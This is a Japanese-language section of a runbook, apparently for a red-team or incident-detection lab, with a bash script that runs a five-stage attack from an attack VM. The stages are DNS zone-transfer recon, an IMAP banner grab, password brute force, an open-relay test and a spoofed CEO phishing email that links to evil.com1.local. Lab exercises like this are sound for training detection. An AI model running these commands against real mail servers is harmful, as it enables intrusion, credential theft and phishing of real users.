# §3. 攻撃実行 (attack-vm から、5 段で 約 2 分)

時刻を記録 (UTC)。/incident の時間窓に使う。

```bash
ATTACK_START="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
ATTACK_START_HM="$(date -u +%H:%M)"
echo "ATTACK_START: $ATTACK_START (HH:MM=$ATTACK_START_HM)"

ssh attack-vm 'set +e
echo "=== 段 1: DNS recon (NS/MX/AXFR) ==="
dig @161.33.24.15 com1.local NS    +short
dig @161.33.24.15 com1.local MX    +short
dig @161.33.24.15 com1.local AXFR  | head -20  # AXFR allow-transfer any 狙い
sleep 2

echo "=== 段 2: IMAP banner grab ==="
echo "" | nc -w 3 168.138.42.63 143
sleep 2

echo "=== 段 3: IMAP brute (slow / 10 user, 8 秒間隔で 80 秒) ==="
for u in admin manager root operator obuchi rocky guest test wpadmin webmaster; do
    swaks --quit-after RCPT --to ${u}@com1.local --server 168.138.42.63:25 --silent 0 \
        2>&1 | tail -2
    # 実際の IMAP brute は dovecot に対して
    (echo "a login $u password123"; sleep 1; echo "a logout") | \
        nc -w 4 168.138.42.63 143 2>&1 | tail -2
    sleep 8
done

echo "=== 段 4: Sendmail relay test (外部 → 外部 中継) ==="
swaks --to attacker@external.example.com --from spoof@com1.local \
      --server 168.138.42.63:25 --header "Subject: relay-test" \
      --body "relay test from attack-vm" --silent 0 2>&1 | tail -10
sleep 2

echo "=== 段 5: なりすまし mail 注入 (SPF 不在悪用) ==="
swaks --to obuchi@com1.local --from "ceo@com1.local" \
      --server 168.138.42.63:25 \
      --header "From: \"CEO Yamada\" <ceo@com1.local>" \
      --header "Subject: 【至急】パスワード変更のお願い" \
      --body "システム更新のため、明日までにこちら https://evil.com1.local/login でパスワード再設定をお願いします。" \
      --silent 0 2>&1 | tail -10
'

ATTACK_END="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
ATTACK_END_HM="$(date -u +%H:%M)"
echo "ATTACK_END:   $ATTACK_END (HH:MM=$ATTACK_END_HM)"
echo "WINDOW: $ATTACK_START_HM-$ATTACK_END_HM (前後 1 分バッファ推奨)"
```
